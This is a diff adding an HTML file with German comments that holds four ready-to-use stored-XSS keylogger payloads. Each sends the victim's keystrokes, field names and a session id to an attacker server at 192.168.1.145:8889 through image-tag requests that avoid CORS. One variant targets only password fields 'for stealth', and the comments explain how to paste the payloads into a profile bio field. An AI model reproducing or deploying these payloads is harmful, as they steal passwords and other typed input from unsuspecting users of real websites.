@@ -1,0 +1,60 @@
+<!--
+XSS Keylogger - NO CORS Version
+Verwendet Image-Tags statt fetch() um CORS zu umgehen
+-->
+
+<!-- VERSION 1: Image Tag - Kein CORS Problem (ca. 200 Zeichen) -->
+<script>var s=Math.random().toString(36).substr(2,9);document.addEventListener('keypress',e=>{new Image().src='http://192.168.1.145:8889/log?k='+e.key+'&f='+(e.target.name||'u')+'&s='+s})</script>
+
+<!-- VERSION 2: Image Tag - Password Only (ca. 180 Zeichen) -->
+<script>var s=Math.random().toString(36).substr(2,9);document.addEventListener('keypress',e=>{if(e.target.type=='password')new Image().src='http://192.168.1.145:8889/log?k='+e.key+'&s='+s})</script>
+
+<!-- VERSION 3: Image Tag - Ultra Mini (ca. 120 Zeichen) -->
+<script>document.addEventListener('keypress',e=>new Image().src='http://192.168.1.145:8889/log?k='+e.key+'&f='+e.target.name)</script>
+
+<!-- VERSION 4: Inline Image mit Event Handler (ca. 150 Zeichen) -->
+<img src=x onerror="var s=Math.random().toString(36).substr(2,9);document.addEventListener('keypress',e=>new Image().src='http://192.168.1.145:8889/log?k='+e.key+'&s='+s)">
+
+<!--
+Warum Image-Tags besser sind:
+
+FETCH-Methode (PROBLEMATISCH):
+- Browser sendet CORS preflight OPTIONS request
+- Server muss korrekt antworten
+- Kann blockiert werden
+- Viele Socket-Fehler
+
+IMAGE-TAG-Methode (BESSER):
+- Keine CORS preflight requests
+- Browser lädt einfach ein "Bild" vom Server
+- Server gibt leeren Response
+- Funktioniert immer, keine Fehler
+
+Verwendung:
+1. Kopiere eines der Payloads oben
+2. Füge ins Bio-Feld ein
+3. Server empfängt GET-Requests via Image-Tag
+4. Keine CORS-Fehler mehr!
+
+Beispiel:
+Wenn Opfer 'test' tippt im username-Feld:
+GET /log?k=t&f=username&s=abc123xyz
+GET /log?k=e&f=username&s=abc123xyz
+GET /log?k=s&f=username&s=abc123xyz
+GET /log?k=t&f=username&s=abc123xyz
+
+Server-Kompatibilität:
+✅ Funktioniert mit aktuellem Server (unterstützt GET)
+✅ Keine Code-Änderungen nötig
+✅ Keine CORS-Konfiguration nötig
+✅ Keine Socket-Errors
+
+Best Practice:
+VERSION 1: Empfohlen für maximale Info
+VERSION 2: Nur Passwords (stealth)
+VERSION 3: Kleinste Version
+VERSION 4: Alternative mit img-Tag
+
+TEST:
+Öffne test_keylogger_nocors.html und tippe etwas
+-->
